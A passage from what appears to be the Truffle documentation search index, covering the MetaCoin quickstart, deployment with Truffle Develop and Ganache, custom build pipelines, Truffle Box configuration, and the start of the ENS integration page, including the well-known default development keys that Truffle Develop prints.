0x97e8168f1c05fc40dd8ffc529b9a2bf45cc7c55b07b6b9a5a22173235ee247b6 > Blocks: 0 Seconds: 0 > contract address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.9914458 > gas used: 108240 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0021648 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6) Deploying 'MetaCoin' -------------------- > transaction hash: 0xee4994097c10e7314cc83adf899d67f51f22e08b920e95b6d3f75c5eb498bde4 > Blocks: 0 Seconds: 0 > contract address: 0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.98449716 > gas used: 347432 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00694864 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00911344 ETH Summary ======= > Total deployments: 3 > Final cost: 0.01466268 ETH This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction hashes, contract addresses, and accounts will be different from the above. Note : To see how to interact with the contract, please skip to the next section. Alternative: Migrating with Ganache \u00b6 While Truffle Develop is an all-in-one personal blockchain and console, you can also use Ganache , a desktop application, to launch your personal blockchain. Ganache can be a more easy-to-understand tool for those new to Ethereum and the blockchain, as it displays much more information up-front. The only extra step, aside from running Ganache, is that it requires editing the Truffle configuration file to point to the Ganache instance. Download and install Ganache . Open truffle-config.js in a text editor. Replace the content with the following: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" } } }; This will allow a connection using Ganache's default connection parameters. Save and close that file. Launch Ganache. Ganache On the terminal, migrate the contract to the blockchain created by Ganache: truffle migrate You will see the following output: Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Compiling ./contracts/Migrations.sol > Artifacts written to /home/david/work/MetaCoin/build/contracts > Compiled successfully using: - solc: 0.5.16+commit.9c3226ce.Emscripten.clang Starting migrations... ====================== > Network name: 'development' > Network id: 5777 > Block gas limit: 6721975 (0x6691b7) 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3eef05e35ce694c0b7112cc22ba462b9cc0563abc2cc444ee9683b6d89865e3c > Blocks: 0 Seconds: 0 > contract address: 0x8CdaF0CD259887258Bc13a92C0a6dA92698644C0 > block number: 1 > block timestamp: 1587421933 > account: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57 > balance: 99.9967165 > gas used: 164175 (0x2814f) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0032835 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.0032835 ETH 2_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 0x23de020bafa41e30615b1d775d2fa9604e876415408e012d1f0faf79eed3a32f > Blocks: 0 Seconds: 0 > contract address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10 > block number: 3 > block timestamp: 1587421933 > account: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57 > balance: 99.99396028 > gas used: 95470 (0x174ee) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0019094 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10) Deploying 'MetaCoin' -------------------- > transaction hash: 0x0cc20353422c4d435f72e8e7850f8178f43bf8d00c8c0d09cc8e0ccdfa81b799 > Blocks: 0 Seconds: 0 > contract address: 0xf25186B5081Ff5cE73482AD761DB0eB0d25abfBF > block number: 4 > block timestamp: 1587421934 > account: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57 > balance: 99.98822922 > gas used: 286553 (0x45f59) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00573106 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00764046 ETH Summary ======= > Total deployments: 3 > Final cost: 0.01092396 ETH This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction IDs and contract addresses may be different from the above. In Ganache, click the \"Transactions\" button to see that the transactions have been processed. To interact with the contract, you can use the Truffle console. The Truffle console is similar to Truffle Develop, except it connects to an existing blockchain (in this case, the one generated by Ganache). truffle console You will see the following prompt: truffle(development)> Interacting with the contract \u00b6 Interact with the contract using the console in the following ways: Note : We're using web3.eth.getAccounts() in these examples, which returns a promise which resolves to an array of all the accounts generated by the mnemonic. So, given the addresses generated by our mnemonic above, specifying (await web3.eth.getAccounts())[0] is equivalent to the address 0x627306090abab3a6e1400e9345bc60c78a8bef57 . As of Truffle v5, the console supports async/await functions, enabling much simpler interactions with the contract. Begin by establishing both the deployed MetaCoin contract instance and the accounts created by either Truffle's built-in blockchain or Ganache: truffle ( development ) > let instance = await MetaCoin . deployed () truffle ( development ) > let accounts = await web3 . eth . getAccounts () Check the metacoin balance of the account that deployed the contract: truffle ( development ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > balance . toNumber () See how much ether that balance is worth (and note that the contract defines a metacoin to be worth 2 ether): truffle ( development ) > let ether = await instance . getBalanceInEth ( accounts [ 0 ]) truffle ( development ) > ether . toNumber () Transfer some metacoin from one account to another: truffle ( development ) > instance . sendCoin ( accounts [ 1 ], 500 ) Check the balance of the account that received the metacoin: truffle ( development ) > let received = await instance . getBalance ( accounts [ 1 ]) truffle ( development ) > received . toNumber () Check the balance of the account that sent the metacoin: truffle ( development ) > let newBalance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > newBalance . toNumber () Continue learning \u00b6 This quickstart showed you the basics of the Truffle project lifecycle, but there is much more to learn. Please continue on with the rest of our documentation and especially our tutorials to learn more.","title":"Quickstart"},{"location":"docs/truffle/quickstart.html#truffle-quickstart","text":"This page will take you through the basics of creating a Truffle project and deploying a smart contract to a blockchain. Note : Before you begin, make sure that you read our Ethereum Overview page.","title":"Truffle Quickstart"},{"location":"docs/truffle/quickstart.html#table-of-contents","text":"Creating a project Exploring the project Testing Compiling Migrating with Truffle Develop Alternative: Migrating with Ganache Interacting with the contract","title":"Table of Contents"},{"location":"docs/truffle/quickstart.html#creating-a-project","text":"To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project template, but for those just getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts: Create a new directory for your Truffle project: mkdir MetaCoin cd MetaCoin Download (\"unbox\") the MetaCoin box: truffle unbox metacoin Note : You can use the truffle unbox <box-name> command to download any of the other Truffle Boxes. Note : To create a bare Truffle project with no smart contracts included, use truffle init . Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle.js : Truffle configuration file","title":"Creating a project"},{"location":"docs/truffle/quickstart.html#exploring-the-project","text":"Note : This page is just a quickstart, so we're not going to go into much detail here. Please see the rest of the Truffle documentation to learn more. Open the contracts/MetaCoin.sol file in a text editor. This is a smart contract (written in Solidity) that creates a MetaCoin token. Note that this also references another Solidity file contracts/ConvertLib.sol in the same directory. Open the contracts/Migrations.sol file. This is a separate Solidity file that manages and updates the status of your deployed smart contract . This file comes with every Truffle project, and is usually not edited. Open the migrations/1_initial_migration.js file. This file is the migration (deployment) script for the Migrations contract found in the Migrations.sol file. Open the migrations/2_deploy_contracts.js file. This file is the migration script for the MetaCoin contract. (Migration scripts are run in order, so the file beginning with 2 will be run after the file beginning with 1 .) Open the test/TestMetaCoin.sol file. This is a test file written in Solidity which ensures that your contract is working as expected. Open the test/metacoin.js file. This is a test file written in JavaScript which performs a similar function to the Solidity test above. Open the truffle-config.js file. This is the Truffle configuration file , for setting network information and other project-related settings. The file is blank, but this is okay, as we'll be using a Truffle command that has some defaults built-in.","title":"Exploring the project"},{"location":"docs/truffle/quickstart.html#testing","text":"On a terminal, run the Solidity test: truffle test ./test/TestMetaCoin.sol You will see the following output TestMetacoin \u221a testInitialBalanceUsingDeployedContract (71ms) \u221a testInitialBalanceWithNewMetaCoin (59ms) 2 passing (794ms) Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . These tree tests were run against the contract, with descriptions displayed on what the tests are supposed to do. Run the JavaScript test: truffle test ./test/metacoin.js You will see the following output Contract: MetaCoin \u221a should put 10000 MetaCoin in the first account \u221a should call a function that depends on a linked library (40ms) \u221a should send coin correctly (129ms) 3 passing (255ms)","title":"Testing"},{"location":"docs/truffle/quickstart.html#compiling","text":"Compile the smart contracts: truffle compile You will see the following output: Compiling .\\contracts\\ConvertLib.sol... Compiling .\\contracts\\MetaCoin.sol... Compiling .\\contracts\\Migrations.sol... Writing artifacts to .\\build\\contracts","title":"Compiling"},{"location":"docs/truffle/quickstart.html#migrating-with-truffle-develop","text":"Note : To use Ganache , please skip to the next section. To deploy our smart contracts, we're going to need to connect to a blockchain. Truffle has a built-in personal blockchain that can be used for testing. This blockchain is local to your system and does not interact with the main Ethereum network. You can create this blockchain and interact with it using Truffle Develop . Run Truffle Develop: truffle develop You will see the following information: Truffle Develop started at http://127.0.0.1:9545/ Accounts: (0) 0x627306090abab3a6e1400e9345bc60c78a8bef57 (1) 0xf17f52151ebef6c7334fad080c5704d77216b732 (2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef (3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 (4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 (5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e (6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 (7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 (8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc (9) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: (0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 (1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f (2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 (3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c (4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 (5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 (6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 (7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 (8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 (9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(development)> This shows ten accounts (and their private keys) that can be used when interacting with the blockchain. On the Truffle Develop prompt, Truffle commands can be run by omitting the truffle prefix. For example, to run truffle compile on the prompt, type compile . The command to deploy your compiled contracts to the blockchain is truffle migrate , so at the prompt, type: migrate You will see the following output: Starting migrations... ====================== > Network name: 'develop' > Network id: 4447 > Block gas limit: 6721975 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3fd222279dad48583a3320decd0a2d12e82e728ba9a0f19bdaaff98c72a030a2 > Blocks: 0 Seconds: 0 > contract address: 0xa0AdaB6E829C818d50c75F17CFCc2e15bfd55a63 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.99445076 > gas used: 277462 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00554924 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00554924 ETH 2_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 0x97e8168f1c05fc40dd8ffc529b9a2bf45cc7c55b07b6b9a5a22173235ee247b6 > Blocks: 0 Seconds: 0 > contract address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.9914458 > gas used: 108240 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0021648 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6) Deploying 'MetaCoin' -------------------- > transaction hash: 0xee4994097c10e7314cc83adf899d67f51f22e08b920e95b6d3f75c5eb498bde4 > Blocks: 0 Seconds: 0 > contract address: 0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.98449716 > gas used: 347432 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00694864 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00911344 ETH Summary ======= > Total deployments: 3 > Final cost: 0.01466268 ETH This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction hashes, contract addresses, and accounts will be different from the above. Note : To see how to interact with the contract, please skip to the next section.","title":"Migrating with Truffle Develop"},{"location":"docs/truffle/quickstart.html#alternative-migrating-with-ganache","text":"While Truffle Develop is an all-in-one personal blockchain and console, you can also use Ganache , a desktop application, to launch your personal blockchain. Ganache can be a more easy-to-understand tool for those new to Ethereum and the blockchain, as it displays much more information up-front. The only extra step, aside from running Ganache, is that it requires editing the Truffle configuration file to point to the Ganache instance. Download and install Ganache . Open truffle-config.js in a text editor. Replace the content with the following: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" } } }; This will allow a connection using Ganache's default connection parameters. Save and close that file. Launch Ganache. Ganache On the terminal, migrate the contract to the blockchain created by Ganache: truffle migrate You will see the following output: Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Compiling ./contracts/Migrations.sol > Artifacts written to /home/david/work/MetaCoin/build/contracts > Compiled successfully using: - solc: 0.5.16+commit.9c3226ce.Emscripten.clang Starting migrations... ====================== > Network name: 'development' > Network id: 5777 > Block gas limit: 6721975 (0x6691b7) 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3eef05e35ce694c0b7112cc22ba462b9cc0563abc2cc444ee9683b6d89865e3c > Blocks: 0 Seconds: 0 > contract address: 0x8CdaF0CD259887258Bc13a92C0a6dA92698644C0 > block number: 1 > block timestamp: 1587421933 > account: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57 > balance: 99.9967165 > gas used: 164175 (0x2814f) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0032835 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.0032835 ETH 2_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 0x23de020bafa41e30615b1d775d2fa9604e876415408e012d1f0faf79eed3a32f > Blocks: 0 Seconds: 0 > contract address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10 > block number: 3 > block timestamp: 1587421933 > account: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57 > balance: 99.99396028 > gas used: 95470 (0x174ee) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0019094 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10) Deploying 'MetaCoin' -------------------- > transaction hash: 0x0cc20353422c4d435f72e8e7850f8178f43bf8d00c8c0d09cc8e0ccdfa81b799 > Blocks: 0 Seconds: 0 > contract address: 0xf25186B5081Ff5cE73482AD761DB0eB0d25abfBF > block number: 4 > block timestamp: 1587421934 > account: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57 > balance: 99.98822922 > gas used: 286553 (0x45f59) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00573106 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00764046 ETH Summary ======= > Total deployments: 3 > Final cost: 0.01092396 ETH This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction IDs and contract addresses may be different from the above. In Ganache, click the \"Transactions\" button to see that the transactions have been processed. To interact with the contract, you can use the Truffle console. The Truffle console is similar to Truffle Develop, except it connects to an existing blockchain (in this case, the one generated by Ganache). truffle console You will see the following prompt: truffle(development)>","title":"Alternative: Migrating with Ganache"},{"location":"docs/truffle/quickstart.html#interacting-with-the-contract","text":"Interact with the contract using the console in the following ways: Note : We're using web3.eth.getAccounts() in these examples, which returns a promise which resolves to an array of all the accounts generated by the mnemonic. So, given the addresses generated by our mnemonic above, specifying (await web3.eth.getAccounts())[0] is equivalent to the address 0x627306090abab3a6e1400e9345bc60c78a8bef57 . As of Truffle v5, the console supports async/await functions, enabling much simpler interactions with the contract. Begin by establishing both the deployed MetaCoin contract instance and the accounts created by either Truffle's built-in blockchain or Ganache: truffle ( development ) > let instance = await MetaCoin . deployed () truffle ( development ) > let accounts = await web3 . eth . getAccounts () Check the metacoin balance of the account that deployed the contract: truffle ( development ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > balance . toNumber () See how much ether that balance is worth (and note that the contract defines a metacoin to be worth 2 ether): truffle ( development ) > let ether = await instance . getBalanceInEth ( accounts [ 0 ]) truffle ( development ) > ether . toNumber () Transfer some metacoin from one account to another: truffle ( development ) > instance . sendCoin ( accounts [ 1 ], 500 ) Check the balance of the account that received the metacoin: truffle ( development ) > let received = await instance . getBalance ( accounts [ 1 ]) truffle ( development ) > received . toNumber () Check the balance of the account that sent the metacoin: truffle ( development ) > let newBalance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > newBalance . toNumber ()","title":"Interacting with the contract"},{"location":"docs/truffle/quickstart.html#continue-learning","text":"This quickstart showed you the basics of the Truffle project lifecycle, but there is much more to learn. Please continue on with the rest of our documentation and especially our tutorials to learn more.","title":"Continue learning"},{"location":"docs/truffle/advanced/build-processes.html","text":"Build Processes \u00b6 Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. In order to provide tight integration with Truffle for those that desire it, Truffle allows you to specify a custom build pipeline meant to bootstrap and configure your application. Truffle provides three methods of integration, described below. Running an external command \u00b6 If you'd like Truffle to run an external command whenever it triggers a build, simply include that option as a string within your project configuration, like so: module . exports = { // This will run the `webpack` command on each build. // // The following environment variables will be set when running the command: // WORKING_DIRECTORY: root location of the project // BUILD_DESTINATION_DIRECTORY: expected destination of built assets (important for `truffle serve`) // BUILD_CONTRACTS_DIRECTORY: root location of your build contract files (.sol.js) // build : \"webpack\" } Note that you're given ample environment variables with which to integrate with Truffle, detailed above. Providing a custom function \u00b6 You can also provide a custom build function like the one below. Note you're given a plethora of information about your project which you can use to integrate tightly with Truffle. module . exports = { build : function ( options , callback ) { // Do something when a build is required. `options` contains these values: // // working_directory: root location of the project // contracts_directory: root directory of .sol files // destination_directory: directory where truffle expects the built assets (important for `truffle serve`) } } Creating a custom module \u00b6 You could also create a module or object that implements the builder interface (i.e., is an object which contains a build function like the one above). This is great for those who want to maintain tighter integration with Truffle and publish a package to make everyone else's lives easier. Here's an example using Truffle's default builder: var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder (...) // specify the default builder configuration here. } Bootstrapping your application \u00b6 Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps: 1) Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. 2) Turn those .json contract artifacts into contract abstractions that are easy to use, via @truffle/contract . 3) Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. 4) Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"@truffle/contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://127.0.0.1:8545\" )); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly.","title":"Build Processes"},{"location":"docs/truffle/advanced/build-processes.html#build-processes","text":"Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. In order to provide tight integration with Truffle for those that desire it, Truffle allows you to specify a custom build pipeline meant to bootstrap and configure your application. Truffle provides three methods of integration, described below.","title":"Build Processes"},{"location":"docs/truffle/advanced/build-processes.html#running-an-external-command","text":"If you'd like Truffle to run an external command whenever it triggers a build, simply include that option as a string within your project configuration, like so: module . exports = { // This will run the `webpack` command on each build. // // The following environment variables will be set when running the command: // WORKING_DIRECTORY: root location of the project // BUILD_DESTINATION_DIRECTORY: expected destination of built assets (important for `truffle serve`) // BUILD_CONTRACTS_DIRECTORY: root location of your build contract files (.sol.js) // build : \"webpack\" } Note that you're given ample environment variables with which to integrate with Truffle, detailed above.","title":"Running an external command"},{"location":"docs/truffle/advanced/build-processes.html#providing-a-custom-function","text":"You can also provide a custom build function like the one below. Note you're given a plethora of information about your project which you can use to integrate tightly with Truffle. module . exports = { build : function ( options , callback ) { // Do something when a build is required. `options` contains these values: // // working_directory: root location of the project // contracts_directory: root directory of .sol files // destination_directory: directory where truffle expects the built assets (important for `truffle serve`) } }","title":"Providing a custom function"},{"location":"docs/truffle/advanced/build-processes.html#creating-a-custom-module","text":"You could also create a module or object that implements the builder interface (i.e., is an object which contains a build function like the one above). This is great for those who want to maintain tighter integration with Truffle and publish a package to make everyone else's lives easier. Here's an example using Truffle's default builder: var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder (...) // specify the default builder configuration here. }","title":"Creating a custom module"},{"location":"docs/truffle/advanced/build-processes.html#bootstrapping-your-application","text":"Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps: 1) Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. 2) Turn those .json contract artifacts into contract abstractions that are easy to use, via @truffle/contract . 3) Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. 4) Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"@truffle/contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://127.0.0.1:8545\" )); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly.","title":"Bootstrapping your application"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html","text":"Creating a Truffle Box \u00b6 Creating a box \u00b6 To create a Truffle Box you'll need a few things: * A GitHub repository * A configuration file * Optionally, small and large images for the box's listing The configuration file and images belong in the top-level directory of your repo. With these files in place, and your repo on GitHub, the unbox command will be: truffle unbox {USER_NAME || ORG_NAME}/{REPO_NAME} If you're starting from scratch , we've created a blueprint box containing a configuration file with common values, as well as template versions of the small and large images. If you're using an existing project , download the files here and extract them into your project. Configuration file \u00b6 All truffle boxes include a configuration file, truffle-box.json . This file has three attributes: ignore , commands , and hooks . ignore (array) \u00b6 An array of files or relative paths you'd like Truffle to ignore when unboxing. Common files include the readme.md or .gitignore . These files will not be copied over from the box's repo when you unbox. \"ignore\" : [ \"README.md\" , \".gitignore\" ] commands (object) \u00b6 An object whose key/value pairs are a descriptor and console command respectively. These pairs will be shown to users once your box is successfully unboxed. Think of these as quick instructions. For example, consider the object below. We've given our users all they need to compile, migrate and test their smart contracts, along with commands for developing the front-end. \"commands\" : { \"Compile\" : \"truffle compile\" , \"Migrate\" : \"truffle migrate\" , \"Test contracts\" : \"truffle test\" , \"Test dapp\" : \"npm test\" , \"Run dev server\" : \"npm run start\" , \"Build for production\" : \"npm run build\" } hooks (object) \u00b6 An object containing console commands to execute once unboxed. Since we're working in Node.js, most commonly this will contain npm install . \"hooks\" : { \"post-unpack\" : \"npm install\" } Images \u00b6 The large box image is a 348px square with 20px of padding on each side. The small box image is 510px x 100px. There is 20px of padding on the left side of the banner and it's minimum size (described in the template as \"Min-Width\") is 330px, including the left padding. The banners are fixed to the left side and crop off the right side as the window narrows. If no images are provided in a box, we default to banners containing the Truffle logo: Truffle site listing \u00b6 Before being listed on the Truffle website, all boxes undergo a screening process to ensure compatibility with Truffle. To start the pre-screening process, send us an email with your desired box name and brief description, along with a link to its GitHub repo to: boxes@trufflesuite.com .","title":"Truffle Boxes"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#creating-a-truffle-box","text":"","title":"Creating a Truffle Box"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#creating-a-box","text":"To create a Truffle Box you'll need a few things: * A GitHub repository * A configuration file * Optionally, small and large images for the box's listing The configuration file and images belong in the top-level directory of your repo. With these files in place, and your repo on GitHub, the unbox command will be: truffle unbox {USER_NAME || ORG_NAME}/{REPO_NAME} If you're starting from scratch , we've created a blueprint box containing a configuration file with common values, as well as template versions of the small and large images. If you're using an existing project , download the files here and extract them into your project.","title":"Creating a box"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#configuration-file","text":"All truffle boxes include a configuration file, truffle-box.json . This file has three attributes: ignore , commands , and hooks .","title":"Configuration file"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#ignore-array","text":"An array of files or relative paths you'd like Truffle to ignore when unboxing. Common files include the readme.md or .gitignore . These files will not be copied over from the box's repo when you unbox. \"ignore\" : [ \"README.md\" , \".gitignore\" ]","title":"ignore (array)"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#commands-object","text":"An object whose key/value pairs are a descriptor and console command respectively. These pairs will be shown to users once your box is successfully unboxed. Think of these as quick instructions. For example, consider the object below. We've given our users all they need to compile, migrate and test their smart contracts, along with commands for developing the front-end. \"commands\" : { \"Compile\" : \"truffle compile\" , \"Migrate\" : \"truffle migrate\" , \"Test contracts\" : \"truffle test\" , \"Test dapp\" : \"npm test\" , \"Run dev server\" : \"npm run start\" , \"Build for production\" : \"npm run build\" }","title":"commands (object)"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#hooks-object","text":"An object containing console commands to execute once unboxed. Since we're working in Node.js, most commonly this will contain npm install . \"hooks\" : { \"post-unpack\" : \"npm install\" }","title":"hooks (object)"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#images","text":"The large box image is a 348px square with 20px of padding on each side. The small box image is 510px x 100px. There is 20px of padding on the left side of the banner and it's minimum size (described in the template as \"Min-Width\") is 330px, including the left padding. The banners are fixed to the left side and crop off the right side as the window narrows. If no images are provided in a box, we default to banners containing the Truffle logo:","title":"Images"},{"location":"docs/truffle/advanced/creating-a-truffle-box.html#truffle-site-listing","text":"Before being listed on the Truffle website, all boxes undergo a screening process to ensure compatibility with Truffle. To start the pre-screening process, send us an email with your desired box name and brief description, along with a link to its GitHub repo to: boxes@trufflesuite.com .","title":"Truffle site listing"},{"location":"docs/truffle/advanced/ethereum-name-service.html","text":"Ethereum Name Service \u00b6 Truffle has a built-in Ethereum Name Service (ENS) integration. ENS is a mechanism that allows for the mapping of human readable names to Ethereum addresses or other resources. With ENS enabled, Truffle allows you to use ENS names when interacting with your contracts and it will resolve them for you. Wherever you can use an address in your transaction parameters, you can use an ENS name as long as you are able to connect successfully to an ENS registry. For more information on the Ethereum Name Service, see the ENS website . Configuration \u00b6 In order to use ENS features in your project, you must first enable it in your Truffle config ( truffle-config.js ). In the config, you must specify an ens property and set ens.enabled to true . The simplest configuration you would have is the following in your Truffle config: module . exports = { ens : { enabled : true } } By default, Truffle connects to the official, ENS-deployed registries. These four registries can be found on: Mainnet Ropsten Rinkeby Goerli If a valid provider is supplied for one of these four networks, Truffle will connect and use the official registry for that particular network; that is, unless a different registry address is specified in the config. If you need to specify a different registry, you can enter it in your config for the <networkName>.ens.registry.address property. If your network name were myNetwork then this might look like: module . exports = { networks : { myNetwork : { host : \"localhost\" , port : 8000 , network_id : \"*\" , ens : { registry : { address : \"0x1234567890123456789012345678901234567890\" } } } }, ens : { enabled : true } } If you are not connected to one of the above four networks and do not supply a registry address. Truffle will attempt to deploy a registry for you to use. See the section below on automatic registry deployment for more information. It must be noted that the registry address you supply needs to agree with whatever provider is present otherwise ENS resolution will not work. In other words, if you supply a provider for Kovan, you must also supply a registry address for an ENS registry on the Kovan network (since Kovan does not have an official ENS registry deployment). As was stated above, however, you do not need to supply a registry address for the above networks unless you want to use a custom ENS registry. ens module methods and properties \u00b6 deployer.ens.registryAddress This property returns the address of the registry that Truffle is connected to. deployer.ens.setAddress() As part of this ENS integration, a new ens module is available 